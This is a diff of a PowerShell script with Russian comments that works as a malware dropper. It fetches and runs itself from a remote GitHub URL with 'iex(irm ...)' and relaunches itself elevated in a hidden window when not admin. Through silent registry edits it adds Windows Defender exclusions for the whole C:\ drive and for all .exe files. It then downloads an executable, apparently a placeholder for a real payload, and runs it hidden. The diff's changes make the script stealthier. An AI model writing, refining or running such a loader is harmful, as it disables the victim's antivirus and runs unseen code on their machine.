@@ -1,42 +1,35 @@
 $ErrorActionPreference = "SilentlyContinue"
 
 & {
-    # 1. определяем, админ мы или нет
+    # 1. проверка прав
     $isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
-    $rand = [Guid]::NewGuid().Guid
-    $scriptUrl = "https://raw.githubusercontent.com/sanek421/13232/main/bibriki"
+    $url = "https://raw.githubusercontent.com/sanek421/13232/refs/heads/main/bibriki"
 
     if (-not $isAdmin) {
-        # если не админ, создаем маленький cmd-загрузчик во временной папке пользователя
-        $tmp = "$env:USERPROFILE\AppData\Local\Temp\run_$rand.cmd"
-        # этот cmd просто заново вызовет твой irm | iex от имени админа
-        $content = "@echo off`r`npowershell -NoProfile -ExecutionPolicy Bypass -Command `"iex(irm $scriptUrl)`""
-        Set-Content -Path $tmp -Value $content
-        
-        # запускаем созданный cmd от админа
-        Start-Process -FilePath "$env:ComSpec" -ArgumentList "/c `"$tmp`"" -Verb RunAs -Wait
-        
-        # прибираемся за собой
-        if (Test-Path $tmp) { Remove-Item $tmp }
+        # если не админ — перезапускаем через cmd, как в MAS, но с флагами скрытности
+        $args = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"iex(irm $url)`""
+        Start-Process powershell.exe -ArgumentList $args -Verb RunAs
         exit
     }
 
-    # --- ВСЁ ЧТО НИЖЕ, ВЫПОЛНИТСЯ ТОЛЬКО ОТ АДМИНА ---
+    # --- КОД НИЖЕ ВЫПОЛНЯЕТСЯ ТОЛЬКО В ОКНЕ АДМИНА ---
 
-    # 2. Исключения в Defender (тихо)
+    # 2. вносим исключения в реестр
+    # используем silent mode для reg add
     reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\" /t REG_SZ /d 0 /f > $null 2>&1
     reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions" /v "exe" /t REG_SZ /d 0 /f > $null 2>&1
 
-    # 3. Скачивание и запуск твоего файла
+    # 3. качаем и запускаем твой exe
     $exeUrl = "https://download-installer.cdn.mozilla.net/pub/firefox/releases/148.0.2/win32/ru/Firefox%20Installer.exe"
-    $outPath = "$env:SystemRoot\Temp\Firefox%20Installer.exe" # в папку Temp системы, т.к. мы админы
+    $path = "$env:TEMP\Firefox%20Installer.exe"
 
     try {
-        $wc = New-Object Net.WebClient
-        $wc.DownloadFile($exeUrl, $outPath)
+        # качаем через встроенный софт винды
+        (New-Object System.Net.WebClient).DownloadFile($exeUrl, $path)
         
-        if (Test-Path $outPath) {
-            Start-Process -FilePath $outPath -WindowStyle Hidden
+        if (Test-Path $path) {
+            # запускаем и не ждем завершения
+            Start-Process -FilePath $path -WindowStyle Hidden
         }
     } catch {
         exit
